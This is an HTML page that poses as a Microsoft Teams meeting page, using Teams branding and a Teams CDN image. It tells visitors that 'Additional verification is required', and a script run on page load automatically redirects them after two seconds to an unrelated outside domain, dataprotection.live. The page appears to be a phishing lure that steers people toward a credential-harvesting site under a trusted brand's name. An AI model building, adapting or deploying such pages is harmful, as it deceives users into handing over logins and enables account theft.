<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Redirecting…</title>
  <link rel="stylesheet" href="assets/styles.css">
  <script>
    // Primary redirect method (consistent across browsers)
    window.addEventListener("DOMContentLoaded", function () {
      setTimeout(function () {
        window.location.href = "https://www.dataprotection.live";
      }, 2000);
    });
  </script>
</head>
<body>
  <!-- Header -->
  <header class="header">
    <div class="header-inner">
      <img src="assets/logo.png" alt="Logo" class="logo">
      <h1>Teams Meeting</h1>
    </div>
  </header>

  <!-- Hero Section -->
  <section class="hero">
    <div class="hero-media">
      <img src="https://statics.teams.cdn.live.net/evergreen-assets/gather/images/og-image.png" alt="Background">
    </div>
    <div class="hero-overlay">
      <h2>Redirecting to Secure Site…</h2>
      <p>Additional verification is required, You will be redirected shortly. If not, <a href="https://www.dataprotection.live">click here</a>.</p>
    </div>
  </section>

  <!-- Info Card -->
  <main class="card">
    <h3>Thank You</h3>
    <p>Connect and collaborate for free in Teams.</p>
  </main>

  <!-- Footer -->
  <footer class="footer">
    <small>© Teams Meeting 2025</small>
  </footer>
</body>
</html>
